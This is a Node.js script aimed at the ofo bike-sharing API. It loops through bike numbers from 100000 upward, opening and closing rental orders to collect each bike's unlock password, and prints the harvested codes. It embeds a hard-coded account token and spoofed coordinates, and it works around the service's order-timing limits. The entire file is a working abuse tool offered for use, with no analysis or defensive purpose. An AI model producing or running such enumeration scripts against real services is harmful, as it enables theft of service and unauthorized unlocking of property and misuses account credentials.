const request = require('superagent');

var ofo = {
  source: 0,
  lat:'37.975067',
  lng:'114.51576',
  // token: '28D9B360-B763-11E6-9E04-95DCC4616393',
  token: '0ABE7990-A5A9-11E6-8FD5-016BD2CF67D2',
  response: function(res){
    res = res.body;
    switch(res.errorCode){
      case 200:
      console.log(res.msg);
      break;
      case 40002:
      console.log('> 订单已结束');
      break;
      case 40003:
      console.error('> 订单未结束');
      break;
      case 40008:
      console.error('> 80内不能结束订单');
      break;
      case 30005:
      console.error('> 您有未完成订单');
      break;
      default:
      console.log(res.msg);
      break;
    }
    return res.values;
  },
  /**
   * [start description]
   * @param  123456
   * @return {"errorCode":200,"msg":"创建订单成功","values":{"info":{"carno":"123456","pwd":"2590","orderno":5135878,"second":0,"repairTime":80,"egt":0,"notice":"","model":2},"notice":""}}
   */
  start: function(carno){
    return request
    .post('https://san.ofo.so/ofo/Api/v2/carno')
    .type('form')
    .send({ 
      carno,
      token: this.token,
      source: this.source,
      lat: this.lat,
      lng: this.lng
    })
  },
  /**
   * [end description]
   * @param  5135878
   * @return {"errorCode":200,"msg":"结束订单成功","values":{"info":{"orderno":5075414,"alpha":1,"baseDistance":0,"baseDistanceCost":0,"overDistance":0,"overDistanceCost":0,"baseTime":15166.387,"baseTimeCost":2.5,"overTime":0,"overTimeCost":0,"packetid":0,"pamounts":0,"s":0,"t":0,"total":0,"isDiscount":0,"opp":-1},"notice":""}}
   */
  end: function(orderno){
    return request
    .post('https://san.ofo.so/ofo/Api/v2/end')
    .type('multipart/form-data')
    .field('orderno', orderno)
    .field('token', this.token)
    .field('source', this.source)
    .field('lat', this.lat)
    .field('lng', this.lng)
  },
  /**
   * [pay description]
   * @param  5075414
   * @return {"errorCode":200,"msg":"订单支付成功","values":{"info":{"yap":10,"orderno":5075414,"title":"ofo红包","url":"https://common.ofo.so/packet/regular_packet.html?random=1481531391538#5075414/2431e0ba8f7187ad82e6367729d0477acdbd787b03ca923d002a89ad587cb8c1110ea4baa0d5262d5e15a4f2481ead552902ec8d99c574b5691c741777ce3c085a5596b18c03cc1168b04aa6b7be4d1b","ptitle":"ofo红包来啦！","pdescr":"抢抢抢ofo红包免费骑车啦！【代步就用ofo】","purl":"http://san.ofo.so/static/128.png","classify":"0","personalReward":0}}}
   */
  pay: function(orderno){
    return request
    .post('https://san.ofo.so/ofo/Api/v2/pay')
    .type('multipart/form-data')
    .field('orderno', orderno)
    .field('packetid', 0)
    .field('token', this.token)
    .field('source', this.source)
    .field('lat', this.lat)
    .field('lng', this.lng)
  }
};

var n = 100000;

(function loop(res){
  res = res || {};
  switch (res.errorCode) {
    case 40007:
    process.exit(-1);
    break;
    case 40008:
    setTimeout(loop.bind(this, {}), 80 * 1000);
    break;
    case 30005:
    var orderno = res.values.info.orderno;
    ofo.end(orderno).then(function(res){
      if(res.body.errorCode == 200){
        ofo.pay(orderno).then(loop);
      }else{
        loop(res.body);
      }
    });
    break;
    default:  
    ofo.start(n).then(function(res){
      if(res.body.errorCode == 200){
        if(res.body.values.info.pwd){
          console.log(res.body.values.info.carno, res.body.values.info.pwd);
          n++;
        }
        loop();
      }else{
        loop(res.body);
      }
    });
  }
  
})();
